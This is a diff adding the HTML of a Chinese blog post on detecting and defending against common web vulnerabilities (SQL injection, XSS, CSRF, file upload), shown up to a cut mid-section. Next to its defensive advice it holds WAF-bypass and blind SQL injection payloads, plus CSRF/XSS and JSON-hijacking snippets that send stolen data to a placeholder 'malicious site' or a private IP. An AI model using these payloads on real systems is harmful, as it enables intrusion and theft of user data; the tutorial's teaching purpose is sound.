@@ -1,0 +1,1509 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/pain.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/pain.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/pain.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/pain.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、绕过WAF的方法 大小写绕过  简单编码绕过  注释绕过：   如?id=1 uni//on sele//ct 1,2,3 #   分隔重写绕过：  适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见Web漏洞的检测与防御方法">
+<meta property="og:url" content="http://yoursite.com/2019/01/30/常见Web漏洞的检测与防御方法/index.html">
+<meta property="og:site_name" content="SKI12">
+<meta property="og:description" content="这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、绕过WAF的方法 大小写绕过  简单编码绕过  注释绕过：   如?id=1 uni//on sele//ct 1,2,3 #   分隔重写绕过：  适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-01-30T15:27:35.213Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="常见Web漏洞的检测与防御方法">
+<meta name="twitter:description" content="这里小结一下常见的Web漏洞类型，待完善。 SQL注入与SQL盲注一、绕过WAF的方法 大小写绕过  简单编码绕过  注释绕过：   如?id=1 uni//on sele//ct 1,2,3 #   分隔重写绕过：  适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/30/常见Web漏洞的检测与防御方法/">
+
+
+
+
+
+  <title>常见Web漏洞的检测与防御方法 | SKI12</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SKI12</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/30/常见Web漏洞的检测与防御方法/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="SKI12">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/pain.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SKI12">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">常见Web漏洞的检测与防御方法</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-30T22:47:15+08:00">
+                2019-01-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>Views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这里小结一下常见的Web漏洞类型，待完善。</p>
+<h1 id="SQL注入与SQL盲注"><a href="#SQL注入与SQL盲注" class="headerlink" title="SQL注入与SQL盲注"></a>SQL注入与SQL盲注</h1><h2 id="一、绕过WAF的方法"><a href="#一、绕过WAF的方法" class="headerlink" title="一、绕过WAF的方法"></a>一、绕过WAF的方法</h2><ol>
+<li><p>大小写绕过</p>
+</li>
+<li><p>简单编码绕过</p>
+</li>
+<li><p>注释绕过：</p>
+</li>
+</ol>
+<p>如?id=1 uni/<strong>/on sele/</strong>/ct 1,2,3 # </p>
+<ol start="4">
+<li>分隔重写绕过：</li>
+</ol>
+<p>适用于WAF采用正则表达式检测所有的敏感字的情况，可以通过注释分开敏感字，如?id=1 un//ion sel//ect 1,2,3 #；至于重写绕过，适用于WAF过滤了一次的情况，如uniunionon，有时候可能还有多次过滤的情况，这时多次尝试也可以。</p>
+<ol start="5">
+<li>HTTP参数污染(HPP)： </li>
+</ol>
+<p>如?id=1 union select 1,2,3 from users where id=1 # </p>
+<p>这时可以改为?id=1 union select 1&amp;id=2,3 from users where id=1 # </p>
+<p>次数&amp;id=会在查询时变成逗号，具体细节取决于 WAF ；</p>
+<p>这个例子也同理：?id=1/<em>/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=</em>/users # </p>
+<p>如果服务器代码为： select <em> from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit “.$_GET[‘c’]; 那么可以构造这样的注入语句： ?a=1 union/&amp;b=/select 1,pass/&amp;c=/from users # 最终解析为： select from table where a=1 union/ and b=/select 1,pass/limit </em>/from users # 可以看到，这种方式比较适合白盒测试。</p>
+<ol start="6">
+<li>使用逻辑运算符 or /and 绕过：</li>
+</ol>
+<p>如?id=1 or 0x50=0x50 </p>
+<p>?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74，其中select pwd from users limit 1,1是从 users 表里查询 pwd 字段的第一条记录， 然后 mid()就是取该记录的第一个字符， lower()把字符转换为小写，  ascii 把 该字符转换成 ascii 码，最后判断等不等于 74。</p>
+<ol start="7">
+<li><p>比较操作符替换：比较操作符如!=、&lt;&gt;、&lt;、&gt;都可以用来替换=来绕过。</p>
+</li>
+<li><p>同功能函数替换：</p>
+</li>
+</ol>
+<p>substring()可以用mid()、substr()这些函数来替换，都是用来取字符串的某一位字符的；</p>
+<p>ascii()编码可以用 hex()、bin()，即十六进制和二进制编码替换；</p>
+<p>在使用在基于延时的盲注中benchmark()和sleep()可以相互替换；</p>
+<p>group_concat 、 concat 、concat_ws 三者可以互相替换；</p>
+<p>还有一种新的方法 ，3条语句分别如下</p>
+<p>substring((select ‘password’),1,1) = 0x70</p>
+<p>substr((select ‘password’),1,1) = 0x70</p>
+<p>mid((select ‘password’),1,1) = 0x70 </p>
+<p>都是从 password 里判断第一个字符的值，可以用 </p>
+<p>strcmp(left(‘password’,1), 0x69) = 1</p>
+<p>strcmp(left(‘password’,1), 0x70) = 0</p>
+<p>strcmp(left(‘password’,1), 0x71) = -1 </p>
+<p>替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。</p>
+<ol start="9">
+<li>盲注无需or和and：</li>
+</ol>
+<p>例句：index.php?id=1</p>
+<p>当and和or被过滤时，可以将 1修改为是通过语句生成的， index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123，123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。</p>
+<ol start="10">
+<li>加括号：</li>
+</ol>
+<p>如?id=(1)union(select(1),mid(hash,1,32)from(users))   </p>
+<p>?id=(1)union(((((((select(1),hex(hash)from(users))))))))</p>
+<p>?id=(1)or(0x50=0x50)</p>
+<p>11.缓冲区溢出绕过：</p>
+<p>如id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 #</p>
+<p>其中 A 越多越好，一般要求 1000 个以上。</p>
+<h2 id="二、检测方法"><a href="#二、检测方法" class="headerlink" title="二、检测方法"></a>二、检测方法</h2><p>1、基于报错的检测方法：</p>
+<p>使用各种符号以及组合： ‘  “  (  %</p>
+<p>如直接在URL后添加单引号看是否报错index.php?id=1’</p>
+<p>2、基于布尔的检测：</p>
+<p>最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0</p>
+<p>当返回的结果不同时即有漏洞</p>
+<p>3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a：</p>
+<p>添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞；</p>
+<p>添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞；</p>
+<p>添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。</p>
+<p>4、判断盲注的常用方法：</p>
+<p>1’ and 1=1 #  </p>
+<p>1’ and 1=2 #  </p>
+<p>判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。</p>
+<h2 id="三、防御方法"><a href="#三、防御方法" class="headerlink" title="三、防御方法"></a>三、防御方法</h2><p>关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。</p>
+<p>常用的修复方案：</p>
+<p>（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。</p>
+<p>（2）过滤危险的 SQL 语句关键字。</p>
+<p>（3）确认每种数据的类型。</p>
+<p>（4）数据长度应该严格规定。</p>
+<p>（5）网站每个数据层的编码统一。</p>
+<p>（6）严格限制网站用户的数据库的操作权限。</p>
+<p>（7）避免网站显示 SQL 错误信息。</p>
+<p>（8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。</p>
+<p>（9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。</p>
+<p>其实最有效的防御手段是下面两种：</p>
+<p>1、预编译：</p>
+<p>原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。</p>
+<p>其过程如下:</p>
+<p>（1）定义预编译的sql语句，其中待填入的参数用?占位。</p>
+<p>（2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。</p>
+<p>（3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。</p>
+<p>（4）执行预处理对象。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql=&quot;select id,no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">prestmt.setInt(1,id);</span><br><span class="line">prestmt.executeQuery();</span><br></pre></td></tr></table></figure>
+<p>2、变量绑定：</p>
+<p>是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多，后面再补充。</p>
+<h1 id="XSS（跨站脚本）"><a href="#XSS（跨站脚本）" class="headerlink" title="XSS（跨站脚本）"></a>XSS（跨站脚本）</h1><h2 id="一、检测方法"><a href="#一、检测方法" class="headerlink" title="一、检测方法"></a>一、检测方法</h2><p>寻找脚本程序的输出显示代码，搜索关键字，显示输出那个变量，跟踪变量是否被过滤。</p>
+<p>可以先输入一些内容，页面返回之后，可以查看网页源代码，搜索内容关键字看看是不是直接返回在页面的HTML代码中。</p>
+<h2 id="二、防御方法"><a href="#二、防御方法" class="headerlink" title="二、防御方法"></a>二、防御方法</h2><p>1、调用函数：对于用户提交的数据可以通过调用函数进行过滤，htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好；str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过。</p>
+<p>2、使用XSS Filter：</p>
+<p>（1）输入过滤：</p>
+<p>输入验证（客户端）：前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。缺点就是容易被修改掉。</p>
+<p>数据消毒（服务器端）：过滤敏感字符（可以和SQL注入的一同过滤），如&lt; &gt; javascript ‘ “ &amp; # expression等。</p>
+<p>（2） 输出编码（服务器端）：可以使用HTML编码（PHP的htmlspecialchars()函数、ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数），用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理。</p>
+<p>常见恶意字符的HTML编码（显示、实体名字、实体编号）：</p>
+<p>&lt;  &lt;;  &amp;#60；</p>
+<p>>  &gt;  &amp;#62；</p>
+<p>&amp;  &amp;  &amp;#38；</p>
+<p>“  “  &amp;#34；</p>
+<p>‘          ‘</p>
+<p>3、白名单和黑名单结合</p>
+<p>4、Noscript：Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本。</p>
+<p>5、Anti_XSS：提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义</p>
+<p>6、HttpOnly：攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。</p>
+<p>PHP设置HttpOnly的方法：</p>
+<p>（1） 修改php.ini文件，设置其值为1或TRUE；</p>
+<p>（2） setcookie()函数和setrawcookie()函数的第七个参数；</p>
+<p>（3）在PHP代码中开启。</p>
+<p>7、Web安全编码规范：对敏感字符转义、URL属性进行相应的规定等。</p>
+<p>8、尽量使用WAF</p>
+<p>9、防御DOM型XSS：</p>
+<p>DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：</p>
+<p>（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</p>
+<p>（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到<script>则进行JS编码。</p>
+<h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><h2 id="一、CSRF攻击获取数据的方法"><a href="#一、CSRF攻击获取数据的方法" class="headerlink" title="一、CSRF攻击获取数据的方法"></a>一、CSRF攻击获取数据的方法</h2><p>要获取的关键数据：用户 id、用户昵称、用户 email、用户个人页面地址等。</p>
+<p>同域内 CSRF 攻击获取数据几乎没任何限制。</p>
+<p>跨域 CSRF 攻击获取数据的几种方法总结如下：</p>
+<p>1、XSS </p>
+<p>2、服务端代理技术</p>
+<p>3、JSON Hijacing</p>
+<p>4、Flash AsctionScript（crossdomain.xml）</p>
+<p>（1）XSS 获取数据：</p>
+<p>如之前关于XSS文章做的三方的演示，使用目标站点上的XSS 漏洞：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">‘http://目标站点/search.php?k</span>=<span class="string">“</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://恶意站点/get.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>’&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中get.js 的代码为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//use DOM method to get your data</span></span><br><span class="line"><span class="keyword">new</span> Image(). src=‘http:<span class="comment">//恶意站点/a.php?data=‘+data;</span></span><br></pre></td></tr></table></figure>
+<p>恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。</p>
+<p>（2）使用 JSON Hijacking技术：</p>
+<p>目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。</p>
+<p>相关代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">hijack</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line"><span class="comment">//use DOM method to get your data</span></span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://192.168.1.2/JSONHiJack.asp?hi="</span>+<span class="built_in">escape</span>(data);</span><br><span class="line">&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src=http:/</span><span class="regexp">/api.fanfou.com/</span>private_messages/inbox.json?callback=hijack&amp;count=<span class="number">2</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>三、使用Flash ActionScript 脚本：</p>
+<p>前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的 AS脚本进行跨域请求。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>相关代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flash.net.*; </span><br><span class="line">var _l = new URLLoader(new URLRequest(“http://目标站点/<span class="string">"));</span></span><br><span class="line"><span class="string">_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);</span></span><br><span class="line"><span class="string">_l.load();</span></span><br></pre></td></tr></table></figure>
+<h2 id="二、检测方法-1"><a href="#二、检测方法-1" class="headerlink" title="二、检测方法"></a>二、检测方法</h2><p>最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>
+<p>一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。</p>
+<p>以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>
+<h2 id="三、防御方法-1"><a href="#三、防御方法-1" class="headerlink" title="三、防御方法"></a>三、防御方法</h2><p>1、 服务端的防御：主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。</p>
+<p>（1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。</p>
+<p>（2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。</p>
+<p>（3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。</p>
+<p>（4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。</p>
+<p>（5）、使用验证码或者密码确认方式，缺点是用户体验差。</p>
+<p>2、 用户端的防御：用户的安全意识与良好的上网习惯。</p>
+<p>3、 安全设备的防御：有些厂商的安全产品能基于硬件层面对HTTP 头部的 Referer 字段内容进行检查来快速准确的识别 CSRF 攻击。</p>
+<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="一、文件上传攻击分类"><a href="#一、文件上传攻击分类" class="headerlink" title="一、文件上传攻击分类"></a>一、文件上传攻击分类</h2><p>1、轻量级检测绕过攻击：</p>
+<p>（1）绕过javascript 对扩展名的检测：</p>
+<p>使用Burpsuite等反向代理工具直接POST数据包到服务端，绕过前端检测，如DVWA中的绕过示例。</p>
+<p>（2）绕过服务端对http request 包MIME 类型检测：</p>
+<p>使用Burpsuite等反向代理工具伪造POST 数据包到服务端，绕过MIME检测，如DVWA中的绕过示例。</p>
+<p>2、文件内容检测绕过攻击：</p>
+<p>文件加载测试绕过：对文件进行代码注入再配合任意解析调用/漏洞。</p>
+<p>3、上传攻击框架漏洞分层以及路径/扩展名检测绕过攻击：</p>
+<table>
+<thead>
+<tr>
+<th>轻量级检测绕过攻击</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>绕过javascript 对扩展名的检测</td>
+<td>代码层漏洞</td>
+</tr>
+<tr>
+<td>绕过服务端对http request 包MIME 类型检测</td>
+<td>代码层漏洞</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>路径、扩展名检测绕过攻击</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>黑名单绕过</td>
+<td>白名单绕过</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>文件名大小写绕过名单列表绕过特殊文件名绕过0x00截断绕过.htaccess文件攻击PHP文件包含漏洞Apache解析漏洞IIS解析漏洞Nginx解析漏洞</td>
+<td>代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞应用层漏洞应用层漏洞应用层漏洞</td>
+<td>0x00截断绕过PHP文件包含漏洞IIS解析漏洞Nginx解析漏洞</td>
+<td>代码层漏洞代码层漏洞应用层漏洞应用层漏洞</td>
+</tr>
+</tbody>
+</table>
+<p>4、文件内容检测绕过攻击：</p>
+<p>文件加载绕过 (代码层漏洞)</p>
+<p>攻击手法与环节如图：</p>
+<p><img src="常见Web漏洞的检测与防御方法/1.png" alt="文件上传攻击思路图"></p>
+<h2 id="二、上传文件中的解析攻击"><a href="#二、上传文件中的解析攻击" class="headerlink" title="二、上传文件中的解析攻击"></a>二、上传文件中的解析攻击</h2><p>1、直接解析（几乎没有防御）：</p>
+<p>比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。</p>
+<p>2、配合解析(有一定程度的防御)：</p>
+<p>可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。</p>
+<p>(1)、本地文件包含解析：主要是PHP本地文件包含</p>
+<p>(2)、.htaccess文件解析</p>
+<p>(3)、Web应用程序解析漏洞以及其原理：</p>
+<p>1.Apache 解析漏洞：</p>
+<p>解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称）</p>
